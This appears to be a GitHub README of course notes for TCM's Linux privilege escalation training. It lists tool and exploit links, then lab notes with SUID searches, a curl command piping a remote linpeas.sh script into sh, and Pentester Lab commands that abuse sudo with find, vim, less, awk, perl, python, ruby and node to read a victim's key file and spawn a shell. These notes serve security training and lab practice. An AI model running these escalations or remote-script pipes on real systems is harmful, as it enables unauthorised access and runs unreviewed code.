# Linux-Privilege-Escalation-Resources
Compilation of Resources for TCM's Linux Privilege Escalation course

### General Links
TCM Website: https://www.thecybermentor.com/

TCM-Sec: https://tcm-sec.com/

Course: 
* https://www.udemy.com/course/linux-privilege-escalation-for-beginners/ (udemy)
* https://academy.tcm-sec.com/p/linux-privilege-escalation (tcm academy)

Twitch: https://www.twitch.tv/thecybermentor

Twitter: https://twitter.com/thecybermentor

YouTube: https://www.youtube.com/c/thecybermentor

TryHackMe: https://tryhackme.com/

LinuxPrivEscArena: https://tryhackme.com/room/linuxprivescarena

### Introduction
Basic Linux Priv Esc: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Linux Priv Esc PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

Linux Priv Esc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

Sushant 747's Guide: https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html

### Exploring Automated Tools
LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum: https://github.com/rebootuser/LinEnum

Linux exploit suggester: https://github.com/mzet-/linux-exploit-suggester

LinuxPrivChecker: https://github.com/sleventyeleven/linuxprivchecker

### Escalation Path: Kernel Exploits
Kernel Exploits: https://github.com/lucyoa/kernel-exploits

### Escalation Path: Sudo
GTFOBins: https://gtfobins.github.io/

LinuxPrivEscPlayground: https://tryhackme.com/room/privescplayground

wget example: https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/

dirsearch: https://github.com/maurosoria/dirsearch

CMS Made Simple ExploitDB: https://www.exploit-db.com/exploits/46635

CVE-2019-14287 ExploitDB: https://www.exploit-db.com/exploits/46635

CVE-2019-18634 GitHub: https://github.com/saleemrashid/sudo-cve-2019-18634

### Escalation Path: Other SUID Escalation
Nginx Exploit: http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

### Escalation Path: Capabilities
Priv Esc using Capabilities: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

SUID vs. Capabilities: https://mn3m.info/posts/suid-vs-capabilities/

Capabilites Priv Esc w/ OpennSLL and Selinux enabled and enforced: https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099

________________________

### PRIVILEGE ESCALATION LAB

curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

https://github.com/jondonas/linux-exploit-suggester-2

https://gtfobins.github.io/

searchsploit Linux local kernel

find / -perm -u=s -type f 2>/dev/null
 
find / -perm -4000 2>/dev/null

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

### Pentester LAB

```
find /home -name .bashrc -exec grep "check_ptlab_key" {} \;
```
# Unix 06: 
```
find /home -name .bashrc -exec grep export {} \; | grep PTLAB
```
```
sudo -u victim find /home
sudo -u victim find /home/victim/ -name key.txt -exec cat {} \;
sudo -u victim find /home/victim/ -name key.txt -exec /bin/bash \;
uid=1001(victim) gid=1001(victim) groups=1001(victim)
```

# Unix 27:      (Vim Privile Escalation)
```
sudo -l
sudo -u victim vim
:r /home/victim/key.txt
:!/bin/bash
uid=1001(victim) gid=1001(victim) groups=1001(victim)
```

# Unix 28:    (Less Privile Escalation)
```
sudo -l 
sudo -u victim less /home/victim/key.txt
sudo -u victim less /etc/passwd
/home/victim/key.txt
!/bin/bash
```

# Unix 29:     (Awk Privile Escalation)
```
sudo -u victim awk '{print $0}' /home/victim/key.txt
sudo -u victim awk '{system("/bin/bash")}'
```
  
# Unix 30:      (Setuid Privile Escalation)

# Unix 31:      (Perl Privile Escalation)
```
sudo -u victim perl -e 'print `cat /home/victim/key.txt`'
sudo -u victim perl -e '`/bin/bash`'
```

# Unix 32:      (Python Privile Escalation)
```
sudo -u victim python
import os
os.system('cat /home/victim/key.txt')
os.system('/bin/bash')
```

# Unix 33:     (Ruby Privile Escalation)
```
sudo -u victim /usr/bin/ruby -e'puts `cat /home/victim/key.txt`'
/usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
```

# Unix 34:      (Node Privile Escalation)
```
sudo -u victim node -e 'var exec = require("child_process").exec;exec("cat /home/victim/key.txt", function (error, stdOut, stdErr) {console.log(stdOut);});'
sudo -u victim node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```


